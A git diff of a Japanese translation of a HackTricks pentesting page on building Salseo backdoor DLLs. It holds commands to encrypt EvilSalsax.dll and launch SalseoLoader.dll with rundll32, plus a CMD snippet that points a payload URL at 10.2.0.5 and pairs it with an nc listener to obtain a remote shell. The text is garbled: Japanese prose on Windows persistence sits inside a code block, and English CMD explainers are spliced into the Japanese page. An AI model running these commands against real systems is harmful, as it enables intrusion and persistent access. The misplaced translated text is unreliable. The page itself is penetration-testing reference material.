@@ -39,25 +39,29 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 ```
 ### Windows
 
-Windows（ウィンドウズ）は、最も一般的なオペレーティングシステムの1つであり、多くのバージョンが存在します。Windowsには、バックドアを作成してシステムに不正アクセスするためのさまざまな方法があります。
+Windowsは、バックドアを作成するためのさまざまな方法を提供しています。以下にいくつかの一般的な手法を紹介します。
 
 #### リモートデスクトップ
 
-リモートデスクトップは、Windowsマシンにリモートでアクセスするための便利な機能です。しかし、この機能は悪意のある攻撃者にとっても有用です。攻撃者は、リモートデスクトップを使用してシステムにアクセスし、バックドアをインストールすることができます。
+リモートデスクトップ（RDP）は、Windowsマシンにリモートでアクセスするための機能です。バックドアを作成するために、攻撃者はRDPを利用してWindowsマシンにアクセスし、システムに対する制御を取得します。
 
 #### サービス
 
-Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムに悪意のあるサービスをインストールし、バックドアを作成することができます。この方法は、システムが起動するたびにバックドアが自動的に実行されるため、攻撃者にとって非常に便利です。
+Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムにバックドアをインストールし、サービスとして実行することで、システムに持続的なアクセスを確保します。
+
+#### スケジュールされたタスク
+
+Windowsのスケジュールされたタスク機能を利用することで、バックドアを作成することができます。攻撃者は、タスクスケジューラを使用して、定期的にバックドアを実行するように設定します。
 
 #### レジストリ
 
-Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを悪用してバックドアを作成することができます。レジストリを変更することで、システムが起動するたびにバックドアが実行されるようにすることができます。
+Windowsのレジストリは、バックドアを作成するための重要な要素です。攻撃者は、レジストリを変更することで、システムの設定や動作を操作し、バックドアを作成します。
 
-#### シェル拡張
+#### ファイルシステム
 
-Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラーの右クリックメニューに追加される機能です。攻撃者は、シェル拡張を使用してバックドアを作成し、ユーザーが特定のファイルやフォルダを右クリックするとバックドアが実行されるようにすることができます。
+Windowsのファイルシステムを利用することで、バックドアを作成することができます。攻撃者は、システムのファイルやディレクトリを操作し、バックドアを配置します。
 
-これらはWindowsでバックドアを作成するための一部の一般的な方法です。攻撃者は、これらの方法を悪用してシステムに不正アクセスすることができます。システムのセキュリティを強化するためには、これらの攻撃方法に対する対策を講じる必要があります。
+これらは、Windowsでバックドアを作成するための一般的な手法の一部です。攻撃者は、これらの手法を組み合わせたり、他の手法を使用したりすることで、より高度な攻撃を行うことができます。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -111,7 +115,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします
 
@@ -123,7 +127,7 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
-プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。
+プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます
 
 ### DllExportをアンインストールします
 
@@ -153,7 +157,7 @@ Visual Studioを**終了**します
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームのターゲット = x64）
+**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> プラットフォームターゲット = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -171,7 +175,7 @@ rundll32.exe SalseoLoader.dll,main
 
 ## DLLを使用してシェルを取得する
 
-**HTTPサーバー**を使用して、**ncリスナー**を設定することを忘れないでください。
+**HTTPサーバー**を使用し、**ncリスナー**を設定することを忘れないでください。
 
 ### Powershell
 ```
@@ -184,13 +188,23 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, managing files and folders, and configuring system settings.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts to exploit vulnerabilities, gain unauthorized access, and perform various malicious activities on a target system. It provides a direct interface to the underlying operating system, giving hackers control over the system's resources and functionalities.
+CMD provides a wide range of commands that can be used to carry out different operations. Some commonly used commands include:
 
-Hackers can use CMD to execute commands to gather information about the target system, such as network configuration, running processes, and user accounts. They can also use CMD to launch attacks, such as brute-forcing passwords, injecting malicious code, and creating backdoors for persistent access.
+- `cd`: Change directory
+- `dir`: List files and directories
+- `mkdir`: Create a new directory
+- `del`: Delete files
+- `copy`: Copy files
+- `move`: Move files
+- `ren`: Rename files
+- `tasklist`: List running processes
+- `taskkill`: Terminate a running process
 
-It is important for system administrators and users to be aware of the potential risks associated with CMD and take necessary precautions to secure their systems. Regularly updating the operating system, using strong passwords, and implementing security measures can help mitigate the risks associated with CMD-based attacks.
+CMD can also be used to execute batch scripts, which are a series of commands stored in a text file with the extension `.bat` or `.cmd`. Batch scripts allow users to automate repetitive tasks by running multiple commands sequentially.
+
+Overall, CMD is a powerful tool for managing and controlling the Windows operating system through the command line interface.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -203,7 +217,7 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
 * [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
 * [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
